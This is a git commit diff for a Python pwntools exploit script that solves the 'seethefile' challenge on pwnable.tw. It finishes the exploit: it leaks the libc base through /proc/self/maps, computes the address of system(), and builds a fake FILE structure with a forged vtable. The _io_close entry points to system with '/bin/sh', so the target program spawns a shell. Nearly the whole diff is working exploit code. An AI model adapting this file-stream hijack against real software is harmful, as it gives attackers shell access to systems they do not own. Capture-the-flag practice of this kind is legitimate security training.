722cf4a8b18f6aac985c0fda6120868c9af9fd21
starbuucks <hee980410@gmail.com>
2020-07-23 01:08:06 +0900

    Finish exploit

--- seethefile/sol_seethefile.py
+++ seethefile/sol_seethefile.py
@@ -51,50 +51,37 @@ def exploit():
 	# libc leak
 	openfile('/proc/self/maps')
 	readfile()
-	if debug:
+	li = []
+	while True:
 		readfile()
-	re = writefile()
-	start = re.find('[heap]') + 7
-	re = re[start : start+8]
-	libc_base = int(re, 16)
+		re = writefile()
+		li_new = re.split('\n')
+		if len(li) != 0:
+			li[-1] += li[0]
+		li += li_new[1:]
+		if 'libc' in re:
+			break
+	for i in li:
+		if 'libc' in i:
+			libc_base = int(i[:8], 16)
+			break
 	log.info('libc_base : '+hex(libc_base))
 	if debug:
-		system_addr = libc_base + 0x3d200
+		system_addr = libc_base + 0x3a950
 	else:
 		system_addr = libc_base + 0x3a940
-
-	# stack leak
-	# readfile()
-	# readfile()
-	# re = writefile()
-	# re_li = re.split('\n')
-	# for i in re_li:
-	# 	if 'stack' in i:
-	# 		re = i[:8]
-	# 		break
-	# stack_base = int(re, 16)
-	# log.info('stack_base : '+hex(stack_base))
-
-	# exploit
-	## fake FILE struct
-	# esp_main = stack_base + 0x1f000
-	# fake_vtable = esp_main + 0xc + 8 - 4 * 17
-	# fake_io_struct = esp_main + 0xc + + 4
 
 	name = 0x0804B260
 	fake_io_addr = name + 0x20 + 4
 
-	#fake_struct = p32(0xffffffff)					# fake _io_struct
-	fake_struct = '/bin/sh\x00'
+	fake_struct = '/bin/sh\x00'			# fake_io struct
 	fake_struct += '\x00' * (0x48 - len(fake_struct))
 	fake_struct += p32(name)			# fake _io_struct, (pointer to null)
 	fake_struct += '\x00' * (0x94 - len(fake_struct))
 	fake_struct += p32(fake_io_addr + len(fake_struct) + 4)
 
-	fake_vtable = p32(0) * 2
-	fake_vtable += p32(system_addr)				# fake vtable, fake _io_finish()
-	fake_vtable += p32(0) * 14
-	fake_vtable += p32(system_addr)				# fake vtable, fake _io_close()
+	fake_vtable = p32(0) * 17
+	fake_vtable += p32(system_addr)		# fake vtable, fake _io_close()
 
 	payload = '\x00' * 0x20
 	payload += p32(fake_io_addr)
@@ -107,7 +94,6 @@ if __name__ == '__main__':
 
 	if debug:
 		s = process("./seethefile")
-		#s = process(['./seethefile'], env={'LD_PRELOAD':'./libc_32.so.6'})
 		pause()
 	else:
 	    s = remote('chall.pwnable.tw', 10200)
